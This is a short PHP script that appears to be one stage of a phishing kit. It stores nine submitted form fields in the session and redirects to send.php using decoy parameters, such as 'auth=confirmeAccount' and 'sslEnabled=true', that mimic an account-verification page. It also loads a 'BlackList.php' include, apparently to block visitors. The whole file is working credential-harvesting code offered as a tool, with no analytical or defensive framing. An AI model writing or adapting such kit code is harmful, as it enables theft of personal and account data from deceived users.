<?php 

include 'includes/functions.php';
include 'includes/BlackList.php';
$rand = randomString(25);
$_SESSION['input9'] = $_POST['input9'];
$_SESSION['input10'] = $_POST['input10'];
$_SESSION['input11'] = $_POST['input11'];
$_SESSION['input12'] = $_POST['input12'];
$_SESSION['input13'] = $_POST['input13'];
$_SESSION['input14'] = $_POST['input14'];
$_SESSION['input15'] = $_POST['input15'];
$_SESSION['input16'] = $_POST['input16'];
$_SESSION['input17'] = $_POST['input17'];

header("location: send.php?cmd=".$rand."&auth=confirmeAccount&path=/personalInfo/?referrer%3D/account/manage&sslEnabled=true");

?>